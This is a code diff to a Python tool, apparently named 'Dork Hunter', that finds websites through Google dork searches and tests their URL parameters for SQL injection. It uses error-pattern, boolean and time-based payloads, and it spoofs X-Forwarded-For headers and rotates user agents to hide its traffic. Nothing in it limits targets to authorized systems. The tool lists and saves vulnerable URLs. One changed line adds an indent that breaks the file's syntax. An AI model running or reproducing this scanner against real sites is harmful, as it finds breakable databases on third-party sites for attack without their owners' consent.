@@ -1,3 +1,7 @@
+
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
 import os
 import random
 import re
@@ -15,13 +19,11 @@ import warnings
 
 warnings.filterwarnings("ignore", category=DeprecationWarning)
 
-
 DEFAULT_SCANNED_URLS_FILE = 'scanned_urls.txt'
 DEFAULT_USER_AGENT_FILE = 'user_agents.txt'
 DEFAULT_PAYLOADS_FILE = 'payloads.txt'
 DEFAULT_REPORT_FILE = 'report.csv'
 DEFAULT_LOG_FILE = 'scanner.log'
-
 MAX_VULNERABLE_URLS = 10
 REQUEST_TIMEOUT = (10, 20)
 DELAY_BETWEEN_REQUESTS = (1, 3)
@@ -38,7 +40,6 @@ SQL_ERROR_PATTERNS = [
     r"db2 sql error"
 ]
 
-
 logging.basicConfig(
     level=logging.WARNING,
     format='%(asctime)s - %(levelname)s - %(message)s',
@@ -49,14 +50,12 @@ logger.propagate = False
 
 
 class CustomSSLAdapter(requests.adapters.HTTPAdapter):
-
     def __init__(self, *args, **kwargs):
         self.ssl_context = create_urllib3_context()
         self.ssl_context.options |= ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3
         self.ssl_context.minimum_version = ssl.TLSVersion.TLSv1_2
         if hasattr(ssl.TLSVersion, "TLSv1_3"):
             self.ssl_context.maximum_version = ssl.TLSVersion.TLSv1_3
-
         try:
             self.ssl_context.options |= ssl.OP_NO_COMPRESSION
         except Exception:
@@ -68,7 +67,6 @@ class CustomSSLAdapter(requests.adapters.HTTPAdapter):
             )
         except Exception:
             pass
-
         super().__init__(*args, **kwargs)
 
     def init_poolmanager(self, *args, **kwargs):
@@ -94,17 +92,11 @@ class SqlScan:
 
     def _configure_session(self) -> requests.Session:
         session = requests.Session()
-
-        base_retry_kwargs = dict(
-            total=3,
-            backoff_factor=1,
-            status_forcelist=[429, 500, 502, 503, 504]
-        )
+        base_retry_kwargs = dict(total=3, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
         try:
             retry_strategy = Retry(allowed_methods={"HEAD", "GET", "OPTIONS"}, **base_retry_kwargs)
         except TypeError:
             retry_strategy = Retry(method_whitelist={"HEAD", "GET", "OPTIONS"}, **base_retry_kwargs)
-
         tls_adapter = CustomSSLAdapter(max_retries=retry_strategy)
         session.mount("https://", tls_adapter)
         session.mount("http://", requests.adapters.HTTPAdapter(max_retries=retry_strategy))
@@ -114,13 +106,11 @@ class SqlScan:
         self.scanned_urls = self.load_scanned_urls(DEFAULT_SCANNED_URLS_FILE)
         self.user_agents = self.load_file(DEFAULT_USER_AGENT_FILE)
         self.payloads = self.load_file(DEFAULT_PAYLOADS_FILE)
-
         if not self.user_agents:
             self.user_agents = [
                 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36",
                 "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
             ]
-
         if not self.payloads:
             self.payloads = [
                 "'",
@@ -156,11 +146,8 @@ class SqlScan:
             'DNT': '1',
             'Connection': 'keep-alive',
             'Upgrade-Insecure-Requests': '1',
-            'X-Forwarded-For': self._generate_random_ip(),
+            'X-Forwarded-For': ".".join(str(random.randint(1, 254)) for _ in range(4)),
         }
-
-    def _generate_random_ip(self) -> str:
-        return ".".join(str(random.randint(1, 254)) for _ in range(4))
 
     def _with_param(self, url: str, param: str, value: str) -> str:
         parsed = urlparse(url)
@@ -174,22 +161,9 @@ class SqlScan:
         start = (page - 1) * 10 + 1
         if start > 91:
             return []
-
-        params = {
-            'q': dork,
-            'key': self.api_key,
-            'cx': self.cse_id,
-            'start': start,
-            'num': 10
-        }
-
+        params = {'q': dork, 'key': self.api_key, 'cx': self.cse_id, 'start': start, 'num': 10}
         try:
-            resp = self.session.get(
-                search_url,
-                headers=self.get_random_headers(),
-                params=params,
-                timeout=REQUEST_TIMEOUT
-            )
+            resp = self.session.get(search_url, headers=self.get_random_headers(), params=params, timeout=REQUEST_TIMEOUT)
             resp.raise_for_status()
             data = resp.json()
             items = data.get('items', [])
@@ -219,22 +193,14 @@ class SqlScan:
             query = parse_qs(parsed.query)
             if not query:
                 return False
-            sql_params = {
-                'id', 'item', 'product', 'user', 'uid', 'pid',
-                'page', 'category', 'order', 'search', 'filter'
-            }
+            sql_params = {'id', 'item', 'product', 'user', 'uid', 'pid', 'page', 'category', 'order', 'search', 'filter'}
             return any(p.lower() in sql_params for p in query.keys())
         except Exception:
             return False
 
     def test_connection(self, url: str) -> bool:
         try:
-            resp = self.session.head(
-                url,
-                headers=self.get_random_headers(),
-                timeout=10,
-                allow_redirects=False
-            )
+            resp = self.session.head(url, headers=self.get_random_headers(), timeout=10, allow_redirects=False)
             return resp.status_code < 400
         except Exception:
             return False
@@ -244,18 +210,14 @@ class SqlScan:
             if not self.test_connection(url):
                 logger.warning(f"Connection failed: {url}")
                 return None
-
             parsed = urlparse(url)
             query = parse_qs(parsed.query)
             if not query:
                 return None
-
             param = list(query.keys())[0]
-
             if not self._is_parameter_dynamic(url, param):
                 self.save_scanned_url(url)
                 return False
-
             result = self._test_payloads(url, parsed, query)
             self.save_scanned_url(url)
             return result
@@ -268,25 +230,17 @@ class SqlScan:
             original = self._make_request(url)
             if original is None:
                 return False
-
             altered_url = self._with_param(url, param, "xyz123")
             altered = self._make_request(altered_url)
             if altered is None:
                 return False
-
             return original != altered
         except Exception:
             return False
 
     def _make_request(self, url: str) -> Optional[str]:
         try:
-            resp = self.session.get(
-                url,
-                headers=self.get_random_headers(),
-                timeout=REQUEST_TIMEOUT,
-                allow_redirects=False,
-                verify=True
-            )
+            resp = self.session.get(url, headers=self.get_random_headers(), timeout=REQUEST_TIMEOUT, allow_redirects=False, verify=True)
             return resp.text
         except Exception:
             return None
@@ -297,13 +251,7 @@ class SqlScan:
             ctx.minimum_version = ssl.TLSVersion.TLSv1_2
             if hasattr(ssl.TLSVersion, "TLSv1_3"):
                 ctx.maximum_version = ssl.TLSVersion.TLSv1_3
-            resp = self.session.get(
-                url,
-                headers=self.get_random_headers(),
-                timeout=15,
-                verify=True,
-                ssl_context=ctx
-            )
+            resp = self.session.get(url, headers=self.get_random_headers(), timeout=15, verify=True, ssl_context=ctx)
             return resp.text
         except Exception:
             return None
@@ -313,23 +261,20 @@ class SqlScan:
             for value in values:
                 for payload in self.payloads:
                     try:
-                        test_url = self._build_test_url(parsed, param, value, payload)
-
+                        q = parse_qs(parsed.query, keep_blank_values=True)
+                        q[param] = [value + payload]
+                        test_url = urlunparse(parsed._replace(query=urlencode(q, doseq=True)))
                         response = self._make_request(test_url)
                         if response is None:
                             response = self._make_request_with_ssl_fallback(test_url)
                             if response is None:
                                 continue
-
                         if self._detect_sql_errors(response):
                             return True
-
                         if self._check_boolean_based(url, param):
                             return True
-
                         if self._check_time_based(url, param):
                             return True
-
                     except Exception:
                         continue
         return False
@@ -357,23 +302,19 @@ class SqlScan:
             f"{param}=1' OR '1'='2",
             f"{param}=1 AND 1=2"
         ]
-
         base = self._make_request(url)
         if not base:
             return False
-
         for t in true_payloads:
             true_url = self._with_param(url, param, t.split("=", 1)[1])
             true_resp = self._make_request(true_url)
             if not true_resp:
                 continue
-
             for f in false_payloads:
                 false_url = self._with_param(url, param, f.split("=", 1)[1])
                 false_resp = self._make_request(false_url)
                 if not false_resp:
                     continue
-
                 if self._calculate_difference(base, true_resp, false_resp):
                     return True
         return False
@@ -405,40 +346,31 @@ class SqlScan:
     def find_vulnerable_urls(self, dork: str, max_vulnerable: int) -> List[str]:
         vulnerable_urls: List[str] = []
         page = 1
-
         print(f"\n{'='*50}")
         print(f"Starting scan for dork: {dork}")
         print(f"{'='*50}\n")
-
         while len(vulnerable_urls) < max_vulnerable and page <= MAX_API_PAGES:
             print(f"[*] Processing page {page}...", end='\r')
-
             urls = self.dorking(dork, page)
             if not urls:
                 print("\n[!] No more results from search engine")
                 break
-
             valid_urls = self.extract_valid_urls(urls)
             if not valid_urls:
                 page += 1
                 continue
-
             with ThreadPoolExecutor(max_workers=5) as executor:
                 results = list(executor.map(self.check_vulnerability, valid_urls))
-
-            for url, result in zip(valid_urls, results):
+            for u, result in zip(valid_urls, results):
                 if result is True:
-                    vulnerable_urls.append(url)
-                    print(f"\n[+] VULNERABLE: {url}")
+                    vulnerable_urls.append(u)
+                    print(f"\n[+] VULNERABLE: {u}")
                 elif result is None:
-                    print(f"\n[-] SKIPPED: {url}")
-
+                    print(f"\n[-] SKIPPED: {u}")
                 if len(vulnerable_urls) >= max_vulnerable:
                     break
-
             page += 1
             time.sleep(random.uniform(*DELAY_BETWEEN_REQUESTS))
-
         print(f"\n{'='*50}")
         print(f"Scan completed. Found {len(vulnerable_urls)} vulnerable URLs")
         print(f"{'='*50}\n")
@@ -459,7 +391,7 @@ def center_text(text: str) -> str:
 
 def get_api_credentials():
     clear_console()
-    banner = (
+        banner = (
         " ██████╗  ██████╗ ██████╗ ██╗  ██╗    ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗\n"
         "██╔══██╗██╔═══██╗██╔══██╗██║ ██╔╝    ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗\n"
         "██║  ██║██║   ██║██████╔╝█████╔╝     ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝\n"
@@ -475,7 +407,7 @@ def get_api_credentials():
         "╚═════╝    ╚═╝       ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═══╝╚═╝  ╚═╝\n"
     )
     print(center_text(banner))
-    print(center_text("Before using the tool, provide your Google Custom Search API key and Custom Search Engine ID."))
+    print(center_text("Provide your Google Custom Search API key and Custom Search Engine ID."))
     api_key = input("\nYour Google Custom Search API key: ").strip()
     cse_id = input("Your Google Custom Search Engine ID: ").strip()
     return api_key, cse_id
@@ -493,19 +425,15 @@ def write_report(vulnerable_urls: List[str], filename: str = DEFAULT_REPORT_FILE
         writer.writerow(["Vulnerable URLs"])
         writer.writerows([[url] for url in vulnerable_urls])
 
-
 def main():
     try:
         api_key, cse_id = get_api_credentials()
         scanner = SqlScan(api_key, cse_id)
-
         while True:
             dork, max_vuln, save_report = get_dork_and_options()
             clear_console()
             print("[*] Scanning started...\n")
-
             vulnerable_urls = scanner.find_vulnerable_urls(dork, max_vuln)
-
             if vulnerable_urls:
                 print("\n[+] Vulnerable URLs found:")
                 for i, url in enumerate(vulnerable_urls, 1):
@@ -515,12 +443,10 @@ def main():
                     print(f"\n[*] Results saved to {DEFAULT_REPORT_FILE}")
             else:
                 print("\n[-] No vulnerable URLs found")
-
             choice = input("\n[?] Run another scan? (y/n): ").lower()
             if choice != 'y':
                 print("\n[*] Exiting. Goodbye!")
                 break
-
     except KeyboardInterrupt:
         print("\n[!] Scan interrupted by user")
     except Exception as e:
